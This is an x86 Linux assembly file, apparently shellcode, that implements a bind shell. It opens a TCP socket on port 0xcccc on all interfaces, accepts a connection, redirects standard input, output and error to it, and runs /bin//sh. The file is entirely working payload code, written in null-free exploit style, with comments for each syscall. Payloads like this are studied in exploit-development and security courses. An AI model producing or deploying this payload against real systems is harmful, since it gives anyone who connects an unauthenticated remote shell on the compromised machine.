        .intel_syntax noprefix
        .globl _start
_start:
        # s = socket(AF_INET, SOCK_STREAM, 0)
        xor edx, edx
        xor ebx, ebx
        push ebx
        inc ebx
        push ebx
        push 2
        mov ecx, esp
        lea eax, [edx+102]
        int 0x80
        # bind(s, {sa_family=AF_INET, sin_port=htons(0xcccc), sin_addr=htonl(INADDR_ANY)}, 16)
        pop ebx
        pop esi
        push edx
        push 0xcccc0002
        push 16
        push ecx
        push eax
        mov ecx, esp
        mov al, 102
        int 0x80
        # listen(s, 0)
        mov [ecx+4], edx
        mov bl, 4
        mov al, 102
        int 0x80
        # c = accept(s, NULL, 16)
        inc bl
        mov al, 102
        int 0x80
        # dup2(c, 0), dup2(c, 1), dup2(c, 2)
        xchg ebx, eax
        lea ecx, [edx+2]
dup_loop:
        mov al, 63
        int 0x80
        dec ecx
        jge dup_loop
        # execve("/bin//sh", {"/bin//sh", NULL}, NULL)
        add esp, 0x14
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
